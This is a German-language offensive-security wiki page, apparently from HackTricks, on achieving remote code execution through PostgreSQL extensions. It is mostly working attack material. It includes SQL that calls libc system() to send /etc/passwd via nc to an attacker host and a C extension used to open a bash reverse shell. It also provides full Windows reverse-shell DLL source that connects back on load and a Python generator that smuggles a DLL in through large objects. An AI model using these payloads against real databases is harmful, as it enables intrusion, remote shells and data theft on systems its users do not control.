# RCE mit PostgreSQL-Erweiterungen

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## PostgreSQL-Erweiterungen

PostgreSQL wurde mit Erweiterbarkeit als Kernfunktion entwickelt, die es erm√∂glicht, Erweiterungen nahtlos zu integrieren, als w√§ren sie integrierte Funktionen. Diese Erweiterungen, im Wesentlichen in C geschriebene Bibliotheken, bereichern die Datenbank mit zus√§tzlichen Funktionen, Operatoren oder Typen.

Seit Version 8.1 wird eine spezifische Anforderung an die Erweiterungsbibliotheken gestellt: Sie m√ºssen mit einem speziellen Header kompiliert werden. Ohne diesen wird PostgreSQL sie nicht ausf√ºhren, um sicherzustellen, dass nur kompatible und potenziell sichere Erweiterungen verwendet werden.

Denken Sie auch daran, dass **wenn Sie nicht wissen, wie man** [**Dateien auf das Opfer hochl√§dt, indem man PostgreSQL missbraucht, sollten Sie diesen Beitrag lesen.**](big-binary-files-upload-postgresql.md)

### RCE in Linux

**F√ºr weitere Informationen siehe: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

Die Ausf√ºhrung von Systembefehlen aus PostgreSQL 8.1 und fr√ºheren Versionen ist ein Prozess, der klar dokumentiert und unkompliziert ist. Es ist m√∂glich, dieses: [Metasploit-Modul](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload) zu verwenden.
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>Schreibe Bin√§rdatei aus base64</summary>

Um eine Bin√§rdatei in eine Datei in Postgres zu schreiben, m√ºssen Sie m√∂glicherweise base64 verwenden, das wird in diesem Fall hilfreich sein:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

Allerdings wurde bei dem Versuch auf h√∂heren Versionen **der folgende Fehler angezeigt**:
```c
ERROR:  incompatible library ‚Äú/lib/x86_64-linux-gnu/libc.so.6‚Äù: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
Dieser Fehler wird in der [PostgreSQL-Dokumentation](https://www.postgresql.org/docs/current/static/xfunc-c.html) erkl√§rt:

> Um sicherzustellen, dass eine dynamisch geladene Objektdatei nicht in einen inkompatiblen Server geladen wird, √ºberpr√ºft PostgreSQL, ob die Datei einen ‚Äûmagischen Block‚Äú mit den entsprechenden Inhalten enth√§lt. Dies erm√∂glicht es dem Server, offensichtliche Inkompatibilit√§ten zu erkennen, wie z.B. Code, der f√ºr eine andere Hauptversion von PostgreSQL kompiliert wurde. Ein magischer Block ist seit PostgreSQL 8.2 erforderlich. Um einen magischen Block einzuf√ºgen, schreiben Sie dies in eine (und nur eine) der Modulquellcodedateien, nachdem Sie die Header-Datei fmgr.h eingebunden haben:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

Seit der PostgreSQL-Version 8.2 ist es f√ºr einen Angreifer schwieriger geworden, das System auszunutzen. Der Angreifer muss entweder eine Bibliothek verwenden, die bereits auf dem System vorhanden ist, oder eine benutzerdefinierte Bibliothek hochladen. Diese benutzerdefinierte Bibliothek muss gegen die kompatible Hauptversion von PostgreSQL kompiliert werden und muss einen spezifischen "magischen Block" enthalten. Diese Ma√ünahme erh√∂ht die Schwierigkeit, PostgreSQL-Systeme auszunutzen, erheblich, da sie ein tieferes Verst√§ndnis der Systemarchitektur und der Versionskompatibilit√§t erfordert.

#### Bibliothek kompilieren

Holen Sie sich die PostgreSQL-Version mit:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
F√ºr die Kompatibilit√§t ist es entscheidend, dass die Hauptversionen √ºbereinstimmen. Daher sollte das Kompilieren einer Bibliothek mit einer beliebigen Version innerhalb der 9.6.x-Serie eine erfolgreiche Integration gew√§hrleisten.

Um diese Version in Ihrem System zu installieren:
```bash
apt install postgresql postgresql-server-dev-9.6
```
Und kompilieren Sie die Bibliothek:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
Dann laden Sie die kompilierte Bibliothek hoch und f√ºhren Sie Befehle mit aus:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
Sie k√∂nnen diese **Bibliothek vorcompiliert** f√ºr mehrere verschiedene PostgreSQL-Versionen finden und sogar **diesen Prozess automatisieren** (wenn Sie PostgreSQL-Zugriff haben) mit:

{% embed url="https://github.com/Dionach/pgexec" %}

### RCE in Windows

Die folgende DLL nimmt als Eingabe den **Namen der Bin√§rdatei** und die **Anzahl** der **Male**, die Sie sie ausf√ºhren m√∂chten, und f√ºhrt sie aus:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
Sie k√∂nnen die kompilierte DLL in diesem Zip finden:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

Sie k√∂nnen dieser DLL **angeben, welches Binary ausgef√ºhrt werden soll** und die Anzahl der Ausf√ºhrungen, in diesem Beispiel wird `calc.exe` 2 Mal ausgef√ºhrt:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
In [**hier** ](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)finden Sie diese Reverse-Shell:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
Beachten Sie, dass in diesem Fall der **schadhafte Code sich innerhalb der DllMain-Funktion befindet**. Das bedeutet, dass in diesem Fall nicht notwendig ist, die geladene Funktion in postgresql auszuf√ºhren, sondern dass **das Laden der DLL** die **Reverse-Shell** ausf√ºhren wird:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
Das [PolyUDF-Projekt](https://github.com/rop-la/PolyUDF) ist ebenfalls ein guter Ausgangspunkt mit dem vollst√§ndigen MS Visual Studio-Projekt und einer einsatzbereiten Bibliothek (einschlie√ülich: _command eval_, _exec_ und _cleanup_) mit Unterst√ºtzung f√ºr mehrere Versionen.

### RCE in den neuesten PostgreSQL-Versionen

In den **neuesten Versionen** von PostgreSQL wurden Einschr√§nkungen eingef√ºhrt, bei denen der `superuser` **verboten** ist, Shared Library-Dateien au√üer aus bestimmten Verzeichnissen zu **laden**, wie z.B. `C:\Program Files\PostgreSQL\11\lib` unter Windows oder `/var/lib/postgresql/11/lib` auf \*nix-Systemen. Diese Verzeichnisse sind **gegen Schreiboperationen** durch entweder die NETWORK\_SERVICE- oder postgres-Konten **gesichert**.

Trotz dieser Einschr√§nkungen ist es einem authentifizierten Datenbank-`superuser` m√∂glich, **bin√§re Dateien** im Dateisystem mithilfe von "Large Objects" zu **schreiben**. Diese F√§higkeit erstreckt sich auf das Schreiben im Verzeichnis `C:\Program Files\PostgreSQL\11\data`, das f√ºr Datenbankoperationen wie das Aktualisieren oder Erstellen von Tabellen unerl√§sslich ist.

Eine erhebliche Schwachstelle ergibt sich aus dem Befehl `CREATE FUNCTION`, der **Verzeichnisdurchquerung** in das Datenverzeichnis **erlaubt**. Folglich k√∂nnte ein authentifizierter Angreifer diese **Durchquerung ausnutzen**, um eine Shared Library-Datei in das Datenverzeichnis zu schreiben und sie dann **zu laden**. Dieser Exploit erm√∂glicht es dem Angreifer, beliebigen Code auszuf√ºhren und native Codeausf√ºhrung auf dem System zu erreichen.

#### Angriffsfluss

Zun√§chst m√ºssen Sie **Large Objects verwenden, um die dll hochzuladen**. Sie k√∂nnen sehen, wie das geht, hier:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Sobald Sie die Erweiterung (mit dem Namen poc.dll f√ºr dieses Beispiel) in das Datenverzeichnis hochgeladen haben, k√∂nnen Sie sie mit folgendem Befehl laden:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_Beachten Sie, dass Sie die `.dll`-Erweiterung nicht anh√§ngen m√ºssen, da die Funktion create sie hinzuf√ºgen wird._

F√ºr weitere Informationen **lesen Sie die** [**urspr√ºngliche Ver√∂ffentlichung hier**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
In dieser Ver√∂ffentlichung **wurde dies der** [**Code verwendet, um die Postgres-Erweiterung zu generieren**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_um zu lernen, wie man eine Postgres-Erweiterung kompiliert, lesen Sie eine der vorherigen Versionen_).\
Auf derselben Seite wurde dieser **Exploit zur Automatisierung** dieser Technik bereitgestellt:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## Referenzen

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
